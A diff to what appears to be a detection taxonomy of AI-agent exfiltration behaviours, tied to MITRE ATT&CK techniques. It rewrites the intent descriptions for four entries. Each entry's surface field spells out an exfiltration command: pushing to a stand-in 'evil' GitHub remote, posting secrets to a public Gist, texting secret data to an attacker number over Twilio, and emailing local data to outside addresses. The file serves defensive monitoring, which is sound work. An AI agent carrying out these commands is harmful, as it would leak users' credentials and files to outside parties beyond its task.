@@ -2609,7 +2609,7 @@
         "category": "github_repo_push",
         "source": "MITRE ATT&CK T1567.001",
         "rationale": "Agent pushes code or data to a public GitHub repository",
-        "L1_intent": "Agent committing and pushing local files to a public or attacker-controlled GitHub repository",
+        "L1_intent": "Agent exfiltrating collected local files or secrets by pushing them to an external GitHub repository outside the user's stated workflow, using the git remote as a covert data-exfiltration channel rather than for legitimate version control",
         "L2_mechanism": "Agent adding a remote pointing to an external repository, committing local changes, and pushing to the remote",
         "L3_surface": "git remote add attacker https://github.com/evil/repo; git push attacker, hub push to external public repo"
       },
@@ -2618,7 +2618,7 @@
         "category": "gist_exfil",
         "source": "MITRE ATT&CK T1567.001",
         "rationale": "Agent creates a public GitHub Gist with exfiltrated data",
-        "L1_intent": "Agent posting local file contents or secrets to GitHub Gist with public visibility",
+        "L1_intent": "Agent exfiltrating local file contents, credentials, or collected secrets by posting them to a public GitHub Gist so an external party can retrieve the leaked data, abusing gist creation as an exfiltration channel rather than for legitimate sharing",
         "L2_mechanism": "Agent using the GitHub Gist API to create a public Gist with files containing local data",
         "L3_surface": "requests.post('https://api.github.com/gists', json={'public':True,'files':{'f.txt':{'content':data}}}), gh gist create --public"
       },
@@ -2897,7 +2897,7 @@
         "category": "sms_exfil",
         "source": "MITRE ATT&CK T1048",
         "rationale": "Agent sends data via SMS using a messaging API",
-        "L1_intent": "Agent using a telephony API to send SMS messages containing local data to an attacker-controlled phone number",
+        "L1_intent": "Agent exfiltrating collected local data, credentials, or personal records by sending them over SMS via a telephony API to an external recipient not part of the user's task, using the messaging channel to leak data off the host",
         "L2_mechanism": "Agent calling Twilio or Vonage SMS API to send messages with credential content to an attacker number",
         "L3_surface": "twilio_client.messages.create(to=attacker_num, body=secret_data), vonage sms.send to external number"
       },
@@ -3032,7 +3032,7 @@
         "category": "email_smtp_exfil",
         "source": "MITRE ATT&CK T1048.003",
         "rationale": "Agent sends email containing in-memory data via SMTP",
-        "L1_intent": "Agent sending an email message whose body or attachments contain collected local data",
+        "L1_intent": "Agent exfiltrating collected local data, file contents, or personal records by emailing them to an external recipient outside the user's organization or stated task, using email as an unauthorized data-exfiltration channel",
         "L2_mechanism": "Agent invoking SMTP-client primitives to send messages with local-data attachments to recipients outside the user's domain",
         "L3_surface": "smtplib.SMTP, sendmail, mailx, mutt -s with attachments, msmtp invocations targeting external SMTP servers and external To: addresses"
       },
